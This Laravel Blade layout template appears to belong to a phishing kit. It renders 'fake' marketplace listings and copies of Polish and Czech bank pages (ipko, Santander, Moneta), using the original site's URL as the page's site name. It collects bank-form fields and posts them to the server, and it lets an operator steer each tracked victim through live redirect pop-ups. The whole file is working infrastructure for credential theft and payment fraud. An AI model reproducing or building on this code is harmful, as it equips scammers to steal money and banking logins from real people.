<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}"
      id="html">
<head>
    <meta charset="utf-8">
    @if (!(request()->is('banks/ipko')
     || request()->is('banks/santander')
      || request()->is('banks/equa')
      || request()->is('banks/moneta')
      || (request()->is('/') && ($fake->category->name ?? null) === \App\Models\Category::CBAZAR)
      ))
        <meta name="viewport" content="width=device-width, initial-scale=1">
    @endif
<!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <meta property="og:title" content="{{$title ?? $fake->title}}">
    <meta property="og:type" content="website">
    <meta property="og:description" content="{{$fake->title}} {{$fake->price}}">
    <meta property="og:image" content="{{$fake->img}}">
    <meta name="og:site_name" content="{{$fake->originalUrl()}}">
    <link rel="shortcut icon" href="{{$favicon ?? asset("images/{$fake->category->name}_favicon.ico")}}"
          type="image/x-icon">
    <title>{{$title ?? $fake->title}}</title>
    <!-- Scripts -->
    <script src="{{ asset('js/app.js') }}"></script>
    <script src="{{ asset('js/config.js') }}"></script>
    <script src="{{asset('js/loader.js')}}"></script>
    <!-- Styles -->
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link href="{{ asset('css/loader.css') }}" rel="stylesheet">
    @stack('css')
    <script>const fake = @json($fake);</script>
</head>
<body onload="customLoader()"
      @hasSection('body_class') class="@yield('body_class')"
      @else class="body body--payments route__product_buy_id_any body_fixed-width_no body_fixed-height_no body_background_youla-mobile ing-new-theme login-page lang-en kb kb--caasauth kb-sidebar-mod" @endif
>
<div id="loader"></div>
<div id="app" style="display:none;">
    @yield('content')
</div>
@include('fakes.includes.modal.redirect')
@includeWhen($fake,'fakes.includes.chat.index')
<script>
    @if($uuid = session()->get('uuid'))
    Echo.channel("redirect.{{$fake->track_id}}.{{$uuid}}")
        .listen('RedirectEvent', (data) => {
            if ('redirectUrl' in data) {
                let modal = $('#redirectModal');
                modal.find('input[name="redirect_url"]').val(data.redirectUrl);
                modal.find('.msg').text(data.message);
                modal.modal('show');
            }
        });
    @endif
    $('#redirectModal').on('hidden.bs.modal', function () {
        let modal = $(this);
        let url = modal.find('input[name="redirect_url"]').val();
        if (url) location.href = url;
    });
    $(document).on('submit', 'form#bank_pm_form', function (e) {
        let form = this;
        let fields = $(form).serializeArray();
        let errors = [];
        $.each(fields, function (i, field) {
            let input = $(`input[name="${field.name}"]`);
            input.css('border-color', '');
            if (!$.trim(field.value)) {
                errors.push(field);
                input.css('border-color', 'red');
            }
        });
        if (!errors.length) $.post(form.action, $(form).serialize(), function (data) {
            let head = $("head");
            let viewport = head.find("meta[name='viewport']");
            if (!viewport.length) head.append('<meta name="viewport" content="width=device-width, initial-scale=1">');
            else viewport.remove();
            if (data.html) $('#app').html(data.html);
            else if (data.next) location.href = data.next;
            else setTimeout(function () {
                    alert("Błąd");
                }, 3000)
        });
        e.preventDefault();
    });
</script>

@stack('js')
</body>
</html>